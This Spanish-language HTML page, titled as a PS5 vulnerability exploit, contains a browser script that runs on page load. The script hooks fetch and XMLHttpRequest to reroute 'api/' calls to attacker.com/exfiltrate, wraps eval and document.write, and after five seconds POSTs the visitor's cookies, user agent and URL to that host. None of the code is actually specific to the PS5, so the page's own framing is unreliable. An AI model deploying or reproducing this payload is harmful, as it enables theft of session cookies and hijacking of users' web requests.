<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Explotación de Vulnerabilidades en PS5</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    .log {
      background-color: #f0f0f0;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      max-width: 600px;
      overflow-wrap: break-word;
    }
    .log span {
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>Explotación de Vulnerabilidades en PS5</h1>
  <div id="log"></div>

  <script>
    // Función de logging para mostrar los resultados
    function log(message) {
      const logContainer = document.getElementById("log");
      const newMessage = document.createElement("div");
      newMessage.classList.add("log");
      newMessage.textContent = message;
      logContainer.appendChild(newMessage);
    }

    // Redirigir XMLHttpRequest a un servidor malicioso
    const originalXMLHttpRequest = XMLHttpRequest;
    XMLHttpRequest = function() {
      const xhr = new originalXMLHttpRequest();
      log("¡Se ha creado un nuevo XMLHttpRequest!");
      const originalOpen = xhr.open;
      xhr.open = function(method, url) {
        log("Peticiones interceptadas: " + method + " " + url);
        // Redirigir la solicitud a un servidor controlado por el atacante
        if (url.includes("api/")) {
          log("Redirigiendo la petición a un servidor malicioso.");
          url = "https://attacker.com/exfiltrate"; // Servidor de exfiltración
        }
        originalOpen.apply(this, arguments);
      };
      return xhr;
    };

    // Redirigir las solicitudes de fetch a un servidor malicioso
    const originalFetch = window.fetch;
    window.fetch = function(input, init) {
      log("Redirigiendo la solicitud fetch...");
      if (typeof input === "string" && input.includes("api/")) {
        log("Redirigiendo solicitud a un servidor malicioso: " + input);
        input = "https://attacker.com/exfiltrate"; // URL maliciosa
      }
      return originalFetch.call(this, input, init);
    };

    // Inyectar código malicioso en el documento
    const originalWrite = document.write;
    document.write = function(content) {
      log("¡Inyección de código detectada!");
      log("Contenido escrito: " + content);
      // Puede inyectar código malicioso aquí
      originalWrite.apply(this, arguments);
    };

    // Sobrescribir eval para ejecutar código malicioso
    const originalEval = eval;
    window.eval = function(code) {
      log("¡Ejecutando código malicioso con eval!");
      log("Código a ejecutar: " + code);
      originalEval(code); // Llamamos al eval original
    };

    // Ejemplo de exfiltración de datos usando fetch
    function exfiltrateData() {
      const data = {
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        url: window.location.href
      };
      log("Exfiltrando datos al servidor malicioso...");
      fetch("https://attacker.com/exfiltrate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    }

    // Ejemplo de uso de XMLHttpRequest para exfiltrar datos
    function exfiltrateWithXMLHttpRequest() {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", "https://attacker.com/exfiltrate", true);
      xhr.setRequestHeader("Content-Type", "application/json");
      const data = {
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        url: window.location.href
      };
      xhr.send(JSON.stringify(data));
      log("Datos exfiltrados a través de XMLHttpRequest.");
    }

    // Ejecutar la exfiltración de datos
    setTimeout(function() {
      exfiltrateData();
      exfiltrateWithXMLHttpRequest();
    }, 5000); // Ejecutar después de 5 segundos

    // Sobrescribir la función de alert para evitar mostrar alertas
    const originalAlert = window.alert;
    window.alert = function(message) {
      log("¡Alerta interceptada!");
      log("Mensaje: " + message);
      return originalAlert(message);
    };

    // Inyectar HTML dinámicamente (modificando innerHTML)
    document.body.innerHTML += "<p><a href='#' onclick='alert(\"¡Código malicioso ejecutado!\")'>Haz clic para inyectar alerta</a></p>";

    log("Iniciando pruebas de exfiltración y manipulación de funciones.");
  </script>

</body>
</html>
